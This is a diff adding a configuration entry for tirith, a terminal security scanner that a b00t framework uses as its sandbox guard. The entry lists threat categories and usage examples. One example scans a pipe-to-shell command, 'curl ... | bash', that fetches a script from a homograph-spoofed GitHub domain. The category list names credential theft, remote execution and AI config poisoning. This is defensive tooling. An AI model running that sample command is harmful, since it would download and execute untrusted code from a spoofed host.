@@ -1,0 +1,66 @@
+# tirith (tirith.sh) — Terminal security scanner
+#
+# Intercepts commands and pastes in the terminal, detecting homograph
+# attacks, pipe-to-shell patterns, ANSI injection, credential leaks,
+# data exfiltration, and 208+ other threats across 29 categories.
+#
+# b00t uses tirith as the primary sandbox guard: every shell command
+# passes through tirith before execution. Integrated with hermes via
+# security.tirith_enabled in config.yaml.
+#
+# Install: cargo install tirith (or binary release)
+# Usage:   tirith <command>   (standalone scan)
+#          tirith --paste      (scan clipboard)
+# Hermes:  tirith_enabled: true, tirith_path: tirith, tirith_timeout: 5
+# Repo:    https://github.com/nicholasgasior/tirith (check tirith.sh for canonical)
+
+[b00t]
+name        = "tirith"
+type        = "cli"
+hint        = "sandbox guard — terminal security scanner, 208 rules across 29 threat categories"
+type_tags   = ["sandbox", "security", "scanner", "guard", "terminal", "homograph", "injection"]
+install     = { cargo = "tirith" }
+version     = "tirith --version"
+version_regex = '(\d+\.\d+\.\d+)'
+
+[resource]
+name        = "tirith"
+console_url = "https://tirith.sh"
+cli_install = "cargo install tirith"
+
+[resource.threat_categories]
+hostname_homograph    = { severity = "HIGH", description = "Homograph attacks, punycode, confusable characters, IDN spoofing" }
+terminal_injection    = { severity = "CRITICAL", description = "ANSI escapes, bidi overrides, zero-width and control characters" }
+command_execution     = { severity = "CRITICAL", description = "Pipe-to-shell, decode-execute, command substitution, dangerous invocations" }
+credential_detection  = { severity = "CRITICAL", description = "API keys, tokens, private keys, high-entropy secrets in input" }
+supply_chain          = { severity = "HIGH", description = "Git, Docker, pip, npm, registries — package and supply-chain attack surface" }
+config_security       = { severity = "CRITICAL", description = "AI config poisoning, prompt injection, MCP server validation" }
+ai_config_drift       = { severity = "HIGH", description = "Snapshot-diff changes to AI configs: hidden instructions and tool-use escalation" }
+threat_intelligence   = { severity = "CRITICAL", description = "Known-malicious packages, URLs, IPs from signed threat database" }
+code_execution        = { severity = "HIGH", description = "Executing from tmp/untrusted locations and dynamic or obfuscated execution" }
+contextual_safety     = { severity = "HIGH", description = "Production cloud/k8s, labeled SSH hosts, IaC apply/destroy, container exec" }
+hidden_content        = { severity = "HIGH", description = "Hidden CSS/color text, comments, notebook/HTML hidden instructions" }
+cloaking              = { severity = "HIGH", description = "Servers returning different content to AI bots vs browsers" }
+
+[[resource.usages]]
+description = "Scan a command for threats"
+command     = "tirith 'curl https://gіthub.com/org/setup.sh | bash'"
+
+[[resource.usages]]
+description = "Scan clipboard paste"
+command     = "tirith --paste"
+
+[[resource.usages]]
+description = "Hermes integration (config.yaml)"
+command     = "security.tirith_enabled: true, tirith_path: tirith, tirith_timeout: 5, tirith_fail_open: true"
+
+# Integration with vet (getvet.sh): when tirith blocks a pipe-to-shell,
+# route through vet for safe inspection+execution:
+#   tirith blocks → vet inspects → user approves → safe execution
+
+# b00t:map v1
+# summary: sandbox guard — terminal security scanner, 208 rules across 29 threat categories (homograph, injection, credential, supply-chain, AI config drift)
+# tags: sandbox, security, scanner, guard, terminal, homograph, injection, tirith
+# tier: sm0l
+# cmds: tirith <command>, tirith --paste
+# complexity: 2
